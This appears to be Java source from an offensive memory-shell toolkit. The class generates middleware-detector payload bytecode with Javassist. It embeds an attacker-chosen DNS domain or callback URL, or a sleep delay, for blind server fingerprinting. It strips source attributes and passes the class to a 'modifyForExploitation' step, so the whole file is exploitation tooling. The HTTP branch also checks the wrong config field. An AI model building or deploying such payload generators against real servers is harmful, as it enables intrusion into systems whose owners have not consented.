package jmg.extender.generator;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import jmg.core.config.AbstractConfig;
import jmg.core.config.Constants;
import jmg.core.util.CtClassUtil;
import jmg.core.util.JavassistUtil;
import jmg.extender.util.DetectorUtil;

/**
 * 中间件/框架探测器
 */
public class ExtenderGenerator {

    public byte[] makeShell(AbstractConfig config) throws Exception {
        String detectorClassName = DetectorUtil.getDetectorClassName(config.getDetectWay());
        byte[] bytes = Utils.generate(detectorClassName, config);
        config.setExtenderBytes(bytes);
        config.setExtenderBytesLength(bytes.length);
        return bytes;
    }


    public static class Utils {
        @SuppressWarnings("unchecked")
        private final static ClassPool pool = ClassPool.getDefault();
        private static byte[] bytes;

        public static byte[] generate(String detectorClassName, AbstractConfig config) throws Exception {
            pool.insertClassPath(new ClassClassPath(ExtenderGenerator.class));
            CtClass ctClass = pool.getCtClass(detectorClassName);
            JavassistUtil.setNameIfNotNull(ctClass, config.getExtenderClassName());
            if (config.getDetectWay().contains(Constants.DETECT_DNS)) {
                if (config.getDnsDomain() != null) {
                    CtMethod getDomain = ctClass.getDeclaredMethod("getDomain");
                    getDomain.setBody(String.format("{return \"%s\";}", config.getDnsDomain()));
                }
            } else if (config.getDetectWay().contains(Constants.DETECT_HTTP)) {
                if (config.getDnsDomain() != null) {
                    CtMethod getBaseURL = ctClass.getDeclaredMethod("getBaseURL");
                    getBaseURL.setBody(String.format("{return \"%s\";}", config.getBaseUrl()));
                }
            } else if (config.getDetectWay().contains(Constants.DETECT_SLEEP)) {
                if (config.getSleepTime() != null) {
                    CtMethod getSeconds = ctClass.getDeclaredMethod("execSleep");
                    getSeconds.setBody(String.format("try{java.lang.Thread.sleep(%sL);}catch (Exception e){}", Integer.valueOf(config.getSleepTime()) * 1000));
                }
                if (config.getServerType() != null) {
                    CtMethod getServerType = ctClass.getDeclaredMethod("getServerType");
                    getServerType.setBody(String.format("{return \"%s\";}", config.getServerType().toLowerCase()));
                }
            }
            JavassistUtil.setNameIfNotNull(ctClass, config.getExtenderClassName());
            JavassistUtil.removeSourceFileAttribute(ctClass);
            bytes = new CtClassUtil(config, pool, ctClass).modifyForExploitation();
            ctClass.detach();

            return bytes;
        }
    }
}
